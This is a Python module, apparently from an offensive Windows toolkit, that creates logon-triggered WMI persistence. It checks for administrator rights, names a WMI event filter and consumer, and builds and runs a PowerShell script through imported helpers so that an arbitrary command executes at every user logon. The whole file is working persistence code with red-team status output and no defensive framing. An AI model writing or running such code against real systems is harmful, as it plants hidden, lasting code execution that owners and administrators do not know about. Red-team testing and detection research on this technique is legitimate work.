"""
Logon-triggered WMI persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_powershell, check_admin
from templates.powershell import generate_creation_script
from config import WQL_QUERIES

def create_logon_persistence(event_name, command):
    """
    Create WMI persistence that triggers on user logon
    
    Args:
        event_name (str): Event name prefix
        command (str): Command to execute
        
    Returns:
        dict: Creation result
    """
    print(f"[*] Creating logon-triggered WMI persistence...")
    
    if not check_admin():
        print("[!] Administrator privileges required")
        return {
            'success': False,
            'error': 'Administrator privileges required'
        }
    
    # Generate names
    filter_name = f"_{event_name}_Filter"
    consumer_name = f"_{event_name}_Consumer"
    
    # Get WQL query for logon
    wql_query = WQL_QUERIES['logon']
    
    # Generate PowerShell script
    ps_script = generate_creation_script(
        filter_name=filter_name,
        consumer_name=consumer_name,
        wql_query=wql_query,
        command=command
    )
    
    # Execute script
    result = run_powershell(ps_script)
    
    if result['success']:
        print(f"[+] WMI logon persistence created successfully")
        print(f"[+] Event Name: {event_name}")
        print(f"[+] Filter: {filter_name}")
        print(f"[+] Consumer: {consumer_name}")
        print(f"[+] Trigger: User logon")
        
        return {
            'success': True,
            'event_name': event_name,
            'filter_name': filter_name,
            'consumer_name': consumer_name,
            'trigger_type': 'logon',
            'command': command,
            'wql_query': wql_query
        }
    else:
        error = result.get('stderr', result.get('error', 'Unknown error'))
        print(f"[-] Failed to create WMI persistence: {error}")
        return {
            'success': False,
            'error': error
        }